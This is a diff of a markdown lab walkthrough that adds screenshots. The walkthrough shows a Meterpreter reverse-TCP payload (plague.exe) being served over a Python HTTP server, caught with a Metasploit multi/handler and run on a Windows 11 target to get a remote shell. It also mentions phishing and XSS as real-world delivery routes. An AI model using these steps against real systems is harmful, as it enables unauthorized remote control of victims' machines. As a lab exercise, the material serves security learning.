@@ -45,6 +45,9 @@ LPORT=1122 \\
 ```
 *Replace `<IP-ADDRESS>` with the actual IP address obtained in Step 1.*
 
+![image](https://github.com/user-attachments/assets/4c3ef797-f4cf-47bb-89f7-51250ae8a0fa)
+
+
 ### 3. Create Python Webserver for Payload Delivery
 
 To transfer the malicious plague.exe file to our target, I will utilize a python server created on my local subnet. Real world scenarios would involve social engineering, cross-site scripting (XSS), phishing, etc.
@@ -53,6 +56,8 @@ To transfer the malicious plague.exe file to our target, I will utilize a python
 ```
 python3 -m http.server 8080
 ```
+![image](https://github.com/user-attachments/assets/af23b722-f206-4dfe-90cc-3f8428ead2a1)
+
 
 ### 4. Configuring Metasploit Handler
 
@@ -70,6 +75,8 @@ The handler will listen for incoming connections from the payload.
 ```
 use exploit/multi/handler
 ```
+![image](https://github.com/user-attachments/assets/60836d48-9869-4cfa-9966-95d700cf34c5)
+
 
 ### 5. Define Expected Payload
 
@@ -82,6 +89,9 @@ set payload windows/x64/meterpreter\_reverse\_tcp
 
 options
 ```
+
+![image](https://github.com/user-attachments/assets/13e72301-ba0d-4937-a615-5d452c8bd670)
+
 
 Executing the options command will display the parameters for the handler. To ensure proper connection, we will need to configure the parameters to our plague.exe payload.
 
@@ -99,6 +109,7 @@ set LPORT 1122
 ```
 exploit
 ```
+![image](https://github.com/user-attachments/assets/a64c6f81-6cb5-4165-b31a-df5596942e91)
 
 ### 7. Payload Delivery and Execution
 
@@ -109,11 +120,21 @@ From the Windows 11 target machine, we must navigate to our Python 3 HTTP server
 ```
 <ip-address>:8080
 ```
+![image](https://github.com/user-attachments/assets/54a2a28a-f0fa-4b92-9d2e-7a1b90a98a9e)
+
 
 *Replace `<IP-ADDRESS>` with the actual IP address obtained in Step 1.*
 
 Click `plague.exe` to download the payload onto the target system and run the payload.
 
+![image](https://github.com/user-attachments/assets/aeb0ce4e-ee43-4818-8738-6c5b8b2cd6a7)
+
 ### 8. Session Confirmation and Control
 
 Upon successful execution of the `plague.exe` payload on the Windows 11 target, a **Meterpreter session** is established on the attacking Kali Linux machine. Control has now been established - granting command-line interface (CLI) and system access to the target machine.
+![image](https://github.com/user-attachments/assets/3c43b6af-7323-4b31-8854-af4a4dc9962e)
+![image](https://github.com/user-attachments/assets/a3ca6fae-0465-4ebb-86ce-13277fceebc7)
+![image](https://github.com/user-attachments/assets/4756c891-3ae8-421e-9be6-f8e0548129b2)
+
+
+
